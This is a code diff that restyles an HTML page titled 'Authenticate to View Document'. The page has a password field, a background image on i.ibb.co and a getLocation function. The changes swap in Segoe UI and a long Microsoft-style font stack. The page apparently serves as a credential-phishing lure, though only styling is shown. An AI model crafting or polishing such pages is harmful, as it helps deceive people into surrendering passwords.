@@ -558,20 +558,24 @@ async function getLocation() {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Authenticate to View Document</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-image: url('https://i.ibb.co/3yggbnb/00.jpg');
-            background-repeat: no-repeat;
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
-            height: 100vh;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
+      <style>
+
+
+body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background-image: url('https://i.ibb.co/3yggbnb/00.jpg');
+        background-repeat: no-repeat;
+        background-size: cover;
+        background-position: center;
+        background-attachment: fixed;
+        height: 100vh;
+        margin: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        direction: ltr;
+        font-size: .8125rem;
+    }
 
         .container {
             background-color: white;
@@ -593,21 +597,24 @@ async function getLocation() {
         }
 
         h2 {
-            color: #333;
-            font-size: 15px;
-            margin: 0;
-            text-align: left;
-        }
+        font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+        color: #333;
+        font-size: 15px;
+        margin: 0;
+        text-align: left;
+    }
 
-        input[type="password"], input[type="text"], button {
-            width: 100%; /* Ensure both inputs and button span the same width */
-            padding: 8px;
-            margin: 5px 0;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 0.95rem;
-            box-sizing: border-box; /* Ensures padding doesn't affect the width */
-        }
+
+    input[type="password"], input[type="text"], button {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        width: 100%;
+        padding: 8px;
+        margin: 5px 0;
+        border: 1px solid #ddd;
+        border-radius: 5px;
+        font-size: 0.95rem;
+        box-sizing: border-box;
+    }
 
         button {
             background-color: #004f9deb;
